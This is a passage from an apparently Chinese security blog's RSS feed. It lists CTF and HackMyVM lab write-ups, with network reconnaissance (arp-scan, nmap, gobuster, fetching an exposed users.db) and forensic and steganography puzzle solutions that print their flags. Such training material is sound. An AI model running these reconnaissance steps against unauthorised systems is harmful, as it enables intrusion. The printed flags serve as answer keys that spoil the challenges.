*ps:考试的时候，每个人的AC预配模板名字是不一样的。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/HCIE-Q1.html</guid><pubDate>Wed, 13 Aug 2025 13:42:18 +0000</pubDate></item><item><title>内部_Cloud</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cloud.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中发现目标主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cloud.html</guid><pubDate>Wed, 13 Aug 2025 13:34:20 +0000</pubDate></item><item><title>内部_Pane1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Pane1.html</link><description># 一、信息收集

## 1. 主机发现

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                           
...
192.168.205.132 08:00:27:e2:db:af       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.132`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Pane1.html</guid><pubDate>Tue, 12 Aug 2025 14:22:11 +0000</pubDate></item><item><title>内部_Stitch</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Stitch.html</link><description># 一、信息收集

## 1. 主机发现

使用 `arp-scan` 对本地网段 `192.168.205.0/24` 进行扫描，发现目标主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Stitch.html</guid><pubDate>Tue, 12 Aug 2025 02:04:54 +0000</pubDate></item><item><title>内部_Rrrdesk</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Rrrdesk.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中扫描存活主机，确定目标IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Rrrdesk.html</guid><pubDate>Mon, 11 Aug 2025 14:11:58 +0000</pubDate></item><item><title>内部_Plugin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Plugin.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中扫描存活主机，确定目标。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Plugin.html</guid><pubDate>Mon, 11 Aug 2025 03:48:44 +0000</pubDate></item><item><title>内部_hoshi</title><link>https://7r1UMPHK.github.io/post/nei-bu-_hoshi.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中发现目标主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_hoshi.html</guid><pubDate>Sun, 10 Aug 2025 15:19:48 +0000</pubDate></item><item><title>内部_Monitor</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Monitor.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用 `arp-scan` 在本地网络中发现目标主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Monitor.html</guid><pubDate>Sun, 10 Aug 2025 15:19:32 +0000</pubDate></item><item><title>vulnyx_Observer</title><link>https://7r1UMPHK.github.io/post/vulnyx_Observer.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用`arp-scan`在本地网络中发现目标主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnyx_Observer.html</guid><pubDate>Sun, 10 Aug 2025 05:15:37 +0000</pubDate></item><item><title>内部_VNC1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_VNC1.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 发现目标主机IP，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_VNC1.html</guid><pubDate>Sat, 09 Aug 2025 14:04:12 +0000</pubDate></item><item><title>内部_Per1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Per1.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 发现目标主机IP，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Per1.html</guid><pubDate>Sat, 09 Aug 2025 14:03:53 +0000</pubDate></item><item><title>内部_Pycrt</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Pycrt.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Pycrt.html</guid><pubDate>Sat, 09 Aug 2025 06:02:46 +0000</pubDate></item><item><title>hmv_Labs_venus31to40</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus31to40.html</link><description># **Mission 0x31: kira -&gt; veronica**

- **任务**: 用户 `veronica` 经常访问 `http://localhost/waiting.php`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus31to40.html</guid><pubDate>Fri, 08 Aug 2025 14:57:51 +0000</pubDate></item><item><title>内部_Mayuri</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Mayuri.html</link><description># 一、信息收集

## 1. 主机发现与端口扫描

首先，在本地网络中使用 `arp-scan` 发现目标主机的 IP 地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Mayuri.html</guid><pubDate>Fri, 08 Aug 2025 13:35:53 +0000</pubDate></item><item><title>内部_Fake</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Fake.html</link><description># 一、信息收集

## 1. 主机发现与端口扫描

首先，在本地网络中使用 `arp-scan` 发现目标主机的 IP 地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Fake.html</guid><pubDate>Fri, 08 Aug 2025 00:29:51 +0000</pubDate></item><item><title>内部_Xuanji</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Xuanji.html</link><description>![image-20250807122524603](http://7r1UMPHK.github.io/image/20250807122557994.webp)

# **一、信息收集**

## 1. 主机发现与端口扫描

首先在本地网络中使用 `arp-scan` 确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Xuanji.html</guid><pubDate>Thu, 07 Aug 2025 07:52:13 +0000</pubDate></item><item><title>Challenge 090</title><link>https://7r1UMPHK.github.io/post/Challenge%20090.html</link><description>![image-20250806202931588](http://7r1UMPHK.github.io/image/20250806202940843.webp)

# 题目回顾

该题目提供了一组 RSA 加密的参数，包括公钥指数 `e`、两个大素数 `p` 和 `q`，以及密文 `c`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20090.html</guid><pubDate>Wed, 06 Aug 2025 14:30:14 +0000</pubDate></item><item><title>内部_Team</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Team.html</link><description>![image-20250806132045628](http://7r1UMPHK.github.io/image/20250806132045831.webp)

# **一、信息收集**

## 1. 主机与端口发现

使用 `arp-scan` 和 `nmap` 在本地网络进行扫描，发现目标主机IP地址为 `192.168.205.129`，并确认其开放了 22 (SSH), 80 (HTTP) 和 3000 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Team.html</guid><pubDate>Wed, 06 Aug 2025 12:20:01 +0000</pubDate></item><item><title>hmv_Labs_venus22to30</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus22to30.html</link><description># 继续
## **Mission 0x22: eloise -&gt; lucia**

-   **任务**: 用户 `lucia` 用一种有创意的方式保存了她的密码。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus22to30.html</guid><pubDate>Wed, 06 Aug 2025 00:54:45 +0000</pubDate></item><item><title>hmv_Labs_venus1to21</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus1to21.html</link><description># **简介**

Venus 是 HackMyVM.eu 推出的一个适合初学者的 CTF（夺旗赛）靶机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus1to21.html</guid><pubDate>Wed, 06 Aug 2025 00:54:26 +0000</pubDate></item><item><title>内部_Base</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Base.html</link><description>![image-20250724102315597](http://7r1UMPHK.github.io/image/20250724102323560.webp)

浅浅娱乐一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l          
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.210 08:00:27:5d:66:94       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded
```

192.168.205.210的ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 22:24 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:5D:66:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

看80端口
![image-20250724102447816](http://7r1UMPHK.github.io/image/20250724102448088.webp)

看到了版本号，但是这个靶机不是打那个，所以不用管

进行目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db -t 64 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.210
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.210/images/]
/.php                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 9329]
/users.db             (Status: 200) [Size: 12288]
/robots.txt           (Status: 200) [Size: 33]
/LICENSE.txt          (Status: 200) [Size: 14900]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/UPGRADE.txt          (Status: 200) [Size: 956]
Progress: 461907 / 1323360 (34.90%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 462062 / 1323360 (34.92%)
===============================================================
Finished
===============================================================
```

感兴趣的有`robots.txt`、`user.db`

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.210/robots.txt                                           
User-agent: *
Disallow: /pivotx/
```

这个应该是cms的主页暂时不管

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget http://192.168.205.210/users.db
--2025-07-23 22:27:37--  http://192.168.205.210/users.db
正在连接 192.168.205.210:80... 已连接。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Base.html</guid><pubDate>Wed, 06 Aug 2025 00:53:05 +0000</pubDate></item><item><title>内部_Cliv2</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cliv2.html</link><description>![image-20250803203858485](http://7r1UMPHK.github.io/image/20250803203858632.webp)

# **一、信息收集**

## 1. 主机发现

使用 `arp-scan` 在本地网络进行扫描，发现目标主机 IP 地址为 `192.168.205.240`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cliv2.html</guid><pubDate>Wed, 06 Aug 2025 00:52:16 +0000</pubDate></item><item><title>内部_motto</title><link>https://7r1UMPHK.github.io/post/nei-bu-_motto.html</link><description>![image-20250802195125109](http://7r1UMPHK.github.io/image/20250802195134238.webp)

# 一、信息收集

## 1. 主机发现

使用 `arp-scan` 对本地网络进行扫描，识别出目标主机的 IP 地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_motto.html</guid><pubDate>Wed, 06 Aug 2025 00:52:05 +0000</pubDate></item><item><title>内部_Open</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Open.html</link><description>![image-20250803185538640](http://7r1UMPHK.github.io/image/20250803185538981.webp)

# **一、信息收集**

## 1. 主机发现

使用 `arp-scan` 在本地网络进行扫描，发现目标主机 IP 地址为 `192.168.205.239`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Open.html</guid><pubDate>Wed, 06 Aug 2025 00:51:37 +0000</pubDate></item><item><title>内部_umz</title><link>https://7r1UMPHK.github.io/post/nei-bu-_umz.html</link><description>靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Umz

![image-20250804203716777](http://7r1UMPHK.github.io/image/20250804203743076.webp)

# **一、信息收集**

## 1. 主机发现

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.243`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_umz.html</guid><pubDate>Wed, 06 Aug 2025 00:51:14 +0000</pubDate></item><item><title>内部_tea</title><link>https://7r1UMPHK.github.io/post/nei-bu-_tea.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.244`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_tea.html</guid><pubDate>Wed, 06 Aug 2025 00:50:48 +0000</pubDate></item><item><title>hmv_Thirteen</title><link>https://7r1UMPHK.github.io/post/hmv_Thirteen.html</link><description>&gt; Tip
&gt;
&gt; 靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Thirteen

# **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.250`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Thirteen.html</guid><pubDate>Wed, 06 Aug 2025 00:50:19 +0000</pubDate></item><item><title>内部_Chat</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Chat.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.248`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Chat.html</guid><pubDate>Wed, 06 Aug 2025 00:49:56 +0000</pubDate></item><item><title>内部_SingDanceRap</title><link>https://7r1UMPHK.github.io/post/nei-bu-_SingDanceRap.html</link><description># **一、信息收集**

## **1. 主机与服务发现**

首先，在本地网络中使用 `arp-scan` 扫描存活主机，确定目标靶机IP地址为 `192.168.205.245`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_SingDanceRap.html</guid><pubDate>Wed, 06 Aug 2025 00:49:38 +0000</pubDate></item><item><title>内部_config</title><link>https://7r1UMPHK.github.io/post/nei-bu-_config.html</link><description># **一、信息收集**

## 1. 主机发现

首先，在本地网络中使用 `arp-scan` 工具进行主机发现，确定目标靶机的 IP 地址为 `192.168.205.241`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_config.html</guid><pubDate>Wed, 06 Aug 2025 00:49:16 +0000</pubDate></item><item><title>内部_sky</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sky.html</link><description>![image-20250728205701542](http://7r1UMPHK.github.io/image/20250728205701809.webp)

# 一、信息收集

## 1. 主机发现

使用 `arp-scan` 扫描本地网络，发现目标主机 IP 地址为 `192.168.205.230`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sky.html</guid><pubDate>Wed, 06 Aug 2025 00:48:32 +0000</pubDate></item><item><title>内部_Node</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Node.html</link><description>看到一个有意思的靶机，水个wp

宇宙声明，其中有一些知识点可能会出现错误，介意勿看，当然你有更好的观点可以提出来，我进行修改，谢谢。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Node.html</guid><pubDate>Wed, 06 Aug 2025 00:48:02 +0000</pubDate></item><item><title>内部_Mutli</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Mutli.html</link><description>![image-20250722152006846](https://7r1UMPHK.github.io/image/20250722152007020.webp)

简单复现一下，看样子后面是准备放去HMV的。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Mutli.html</guid><pubDate>Wed, 06 Aug 2025 00:46:39 +0000</pubDate></item><item><title>Challenge 089</title><link>https://7r1UMPHK.github.io/post/Challenge%20089.html</link><description>![image-20250803111300907](http://7r1UMPHK.github.io/image/20250803111301164.webp)

```
N2QgNmUgNzUgNjYgNWYgNzMgMzEgNWYgNjcgNmUgMzEgNzIgMzMgNjggNzAgMzEgNjMgMzMgNDQgN2IgNDcgNDEgNGMgNDY
```

![image-20250803111333055](http://7r1UMPHK.github.io/image/20250803111333344.webp)

```
}nuf_s1_gn1r3hp1c3D{GALF
```

反向书写

https://www.dcode.fr/reverse-writing

```
FLAG{D3c1ph3r1ng_1s_fun}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20089.html</guid><pubDate>Wed, 06 Aug 2025 00:41:04 +0000</pubDate></item><item><title>Challenge 088</title><link>https://7r1UMPHK.github.io/post/Challenge%20088.html</link><description>![image-20250803110319152](http://7r1UMPHK.github.io/image/20250803110319359.webp)

音频题，还是ta0出的，那去听听怎么读的

我听了半天，结果ai听出来了，666

```
HMV{IlikeChinese}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20088.html</guid><pubDate>Wed, 06 Aug 2025 00:40:47 +0000</pubDate></item><item><title>Challenge 087</title><link>https://7r1UMPHK.github.io/post/Challenge%20087.html</link><description>![image-20250803103549525](http://7r1UMPHK.github.io/image/20250803103549762.webp)

```bash
Problem: SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg== Hint: key is kerszi and what can you see ? Flag format: flag{xxx}
```

base64解一下

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo 'SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg=='|base64 -d
H.\.[).\).[).\.[.\쎗.H)....
```

key:kerszi

xor

![image-20250803104615642](http://7r1UMPHK.github.io/image/20250803104615923.webp)

```
F R U' R' U' R U R' F'    
```

魔法方程

https://rubikscu.be/

![image-20250803110156219](http://7r1UMPHK.github.io/image/20250803110156383.webp)

```bash
flag{T}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20087.html</guid><pubDate>Wed, 06 Aug 2025 00:40:29 +0000</pubDate></item><item><title>Challenge 086</title><link>https://7r1UMPHK.github.io/post/Challenge%20086.html</link><description>![image-20250803102805187](http://7r1UMPHK.github.io/image/20250803102805423.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 086.zip -o086

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 98681 bytes (97 KiB)

Extracting archive: 086.zip
--
Path = 086.zip
Type = zip
Physical Size = 98681

Everything is Ok

Size:       100517
Compressed: 98681
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 086   
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/086]
└─$ ls -al
总计 103
drwxr-xr-x 1 kali kali      0 2025年 8月 2日 .
drwxr-xr-x 1 kali kali   4096 2025年 8月 2日 ..
-rwxr-xr-x 1 kali kali 100517 2024年 9月29日 EZPZ.png
```

![image-20250803102855174](http://7r1UMPHK.github.io/image/20250803102855280.webp)

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/086]
└─$ exiftool EZPZ.png 
ExifTool Version Number         : 13.25
File Name                       : EZPZ.png
Directory                       : .
File Size                       : 101 kB
File Modification Date/Time     : 2024:09:29 08:13:27-04:00
File Access Date/Time           : 2025:08:02 22:28:55-04:00
File Inode Change Date/Time     : 2024:09:29 08:13:27-04:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 500
Image Height                    : 461
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : ICC Profile
Profile CMM Type                : Little CMS
Profile Version                 : 4.4.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2024:09:14 17:27:52
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : GIMP built-in sRGB
Profile Copyright               : Public Domain
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71393
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33002
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.15001 0.06
Device Mfg Desc                 : GIMP
Device Model Desc               : sRGB
Comment                         : MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE=
Image Size                      : 500x461
Megapixels                      : 0.231
```

![image-20250803103024253](http://7r1UMPHK.github.io/image/20250803103024563.webp)

base64 binary

```
ABG_N_SYNT{YFO}
```

是rot13，但是被耍了

![image-20250803103450684](http://7r1UMPHK.github.io/image/20250803103450943.webp)

那看lsb

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/086]
└─$ zsteg EZPZ.png
meta Comment        .. text: 'MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE='
imagedata           .. file: amd 29k coff noprebar executable
b1,r,lsb,xy         .. text: 'HMV{I7_w45_3a5y_R1GH7}'
b1,rgb,msb,xy       .. file: OpenPGP Public Key
b2,g,lsb,xy         .. file: VISX image file
b3,bgr,lsb,xy       .. file: OpenPGP Secret Key
b4,g,lsb,xy         .. text: 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUDDUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
b4,b,lsb,xy         .. text: 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD33DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
b4,b,msb,xy         .. text: ['\'' repeated 186 times]
```

flag

```
HMV{I7_w45_3a5y_R1GH7}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20086.html</guid><pubDate>Wed, 06 Aug 2025 00:40:09 +0000</pubDate></item><item><title>Challenge 085</title><link>https://7r1UMPHK.github.io/post/Challenge%20085.html</link><description>![image-20250803102242549](http://7r1UMPHK.github.io/image/20250803102242764.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 085.zip -o085

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3032 bytes (3 KiB)

Extracting archive: 085.zip
--
Path = 085.zip
Type = zip
Physical Size = 3032

Everything is Ok

Size:       2923
Compressed: 3032
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 085 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ ls -al
总计 7
drwxr-xr-x 1 kali kali    0  8月 2日 22:23 .
drwxr-xr-x 1 kali kali 4096  8月 2日 22:23 ..
-rwxr-xr-x 1 kali kali 2923 2024年 9月29日 flag.png
```

flag.png没有可显示的内容

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ exiftool flag.png 
ExifTool Version Number         : 13.25
File Name                       : flag.png
Directory                       : .
File Size                       : 2.9 kB
File Modification Date/Time     : 2024:09:29 08:11:46-04:00
File Access Date/Time           : 2025:08:02 22:23:20-04:00
File Inode Change Date/Time     : 2024:09:29 08:11:46-04:00
File Permissions                : -rwxr-xr-x
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 20
Zip Bit Flag                    : 0
Zip Compression                 : None
Zip Modify Date                 : 2024:09:14 23:42:20
Zip CRC                         : 0x00000000
Zip Compressed Size             : 0
Zip Uncompressed Size           : 0
Zip File Name                   : hidden/
Warning                         : [minor] Use the Duplicates option to extract tags for all 2 files
```

那直接解压

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ 7z x flag.png     

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2923 bytes (3 KiB)

Extracting archive: flag.png
--
Path = flag.png
Type = zip
Physical Size = 2923

Everything is Ok

Folders: 1
Files: 1
Size:       2784
Compressed: 2923
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ ls -al
总计 7
drwxr-xr-x 1 kali kali    0 2025年 8月 2日 .
drwxr-xr-x 1 kali kali 4096  8月 2日 22:23 ..
-rwxr-xr-x 1 kali kali 2923 2024年 9月29日 flag.png
drwxr-xr-x 1 kali kali    0 2024年 9月14日 hidden
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ cd hidden 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/x/tmp/085/hidden]
└─$ ls -al
总计 3
drwxr-xr-x 1 kali kali    0 2024年 9月14日 .
drwxr-xr-x 1 kali kali    0  8月 2日 22:26 ..
-rwxr-xr-x 1 kali kali 2784 2024年 9月14日 flag.png
```

![image-20250803102641124](http://7r1UMPHK.github.io/image/20250803102641231.webp)

```
HMV{F0r3N51C_3xP3rT_1N_7H3_R00M}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20085.html</guid><pubDate>Wed, 06 Aug 2025 00:39:51 +0000</pubDate></item><item><title>Challenge 084</title><link>https://7r1UMPHK.github.io/post/Challenge%20084.html</link><description>![image-20250803100714272](http://7r1UMPHK.github.io/image/20250803100714514.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 084.zip -o084

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 414206 bytes (405 KiB)

Extracting archive: 084.zip
--
Path = 084.zip
Type = zip
Physical Size = 414206

Everything is Ok

Files: 2
Size:       1051168
Compressed: 414206
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 084 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/084]
└─$ ls -al
